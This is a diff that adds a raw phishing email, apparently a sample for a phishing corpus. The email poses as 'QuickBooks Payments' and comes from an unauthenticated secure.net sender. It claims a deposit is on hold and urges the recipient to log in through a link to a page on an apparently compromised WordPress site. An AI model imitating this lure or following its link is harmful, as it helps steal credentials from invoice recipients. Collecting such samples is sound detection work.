@@ -1,0 +1,30 @@
+Return-Path: <intuit.payments@secure.net>
+Received: from secure.net ([216.59.45.70])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 2igq78edd13q58t0368hnol2vkebv878ok39l901
+ for zingerpie@kfcreview.com;
+ Thu, 23 Jul 2026 19:45:47 +0000 (UTC)
+Received-SPF: none (spfCheck: 216.59.45.70 is neither permitted nor denied by domain of secure.net) client-ip=216.59.45.70; envelope-from=intuit.payments@secure.net; helo=secure.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 216.59.45.70 is neither permitted nor denied by domain of secure.net) client-ip=216.59.45.70; envelope-from=intuit.payments@secure.net; helo=secure.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIMFBpUXZMK2dCaEQxWXYweUZmL3NOQTJHdnVCOGkvaUdHb1J1aUs4M0xhMW5TTWMxbXh3QlZwK2FpdzJ6WG4yWjdkeStObnZweE9nVC9SRjM2TzMzSEU1Y1VyK1UyeDBUbmZQMlNUV1d4bG9EVUJoUDRybWw0RmFFNENPYnc5eW9hYzlBS3JxOVBzejUxVmJMMm95am4xVTkwd0dscmdnWU9VTjVoSUNOT1FUNVdKbXRUQkhQY2x3UTlzVWZPdXhxczhhckRtbCtPdFRWUzA0QTN0cldzcFB6N3p2Sk5xbkU2aWxkMmhRU0l3QzJwQzFxUEZYWk9pUlFNVGNWZkVFT3RLSXFrb2p1bWlIeHR2aDhmcUROL2h1clhQMFVrZDJMcDBNUnkrSlNUR0djRjMvYXQ4Qmg1WDFkSFpyMjhlemc9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=OBgZkO+mi0UAW4aSELwXGjNwTA5oUJEbxIj5BSiCRlOIPhgmoQiVBO7Ris1TT+AsezfKlKwwN4gBKvpZQbAs+8QE7y8p42n0mMpRUWVVD8kZZwFCSq11umFMueRSpwB2FffHZTgLsh0pWqm+tU84z70gb5shoZ4yFzR8rIYAMj4=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1784835948; v=1; bh=MwJViuTsaJf40T5wdOlNfrG3+HNapE0AdGhL35Vq8dQ=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "QuickBooks Payments" <intuit.payments@secure.net>
+To: zingerpie@kfcreview.com
+Subject: Intuit Payments Deposit
+Date: 23 Jul 2026 15:45:47 -0400
+Message-ID: <20260723154547.C11194AAC493015B@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+zingerpie@kfcreview.com
+<BR><BR>A new payment deposit was generated today for your invoice.<BR><BR>=
+However, due to a discrepancy identified during our security verification p=
+rocess, your invoice has been placed on immediate hold.<BR><BR>Prompt actio=
+n is required to resolve this issue and prevent any further delay in proces=
+sing your payment.<BR><BR>Login below to continue.<BR><BR>
+<A href=3D"https://adatuna.com.tr/wp-content/red/dwx.htm">PAYMENTS DEPOSIT<=
+/A><BR>
+<P><BR>Sincerely,<BR>Intuit Payments Team</P></BODY></HTML>
